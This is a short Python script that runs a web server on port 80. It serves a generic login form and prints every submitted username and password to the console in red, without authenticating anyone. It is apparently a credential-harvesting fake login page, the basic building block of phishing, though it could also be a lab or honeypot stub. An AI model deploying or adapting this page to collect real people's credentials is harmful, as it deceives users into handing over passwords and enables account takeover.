from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs


class LoginHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'''
            <html>
            <head><title>Login Page</title></head>
            <body>
            <h1>Welcome to the Login Page</h1>
            <form action="/login" method="post">
            User: <input name="user"><br>
            Password: <input type="password" name="pass"><br>
            <input type="submit" value="Login">
            </form>
            </body>
            </html>
        ''')

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = parse_qs(self.rfile.read(length).decode())
        user, password = data.get('user', [''])[0], data.get('pass', [''])[0]
        print(f"\033[91m[HTTP] User: {user}, Password:{password}\033[0m")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Login received')


HTTPServer(('0.0.0.0', 80), LoginHandler).serve_forever()
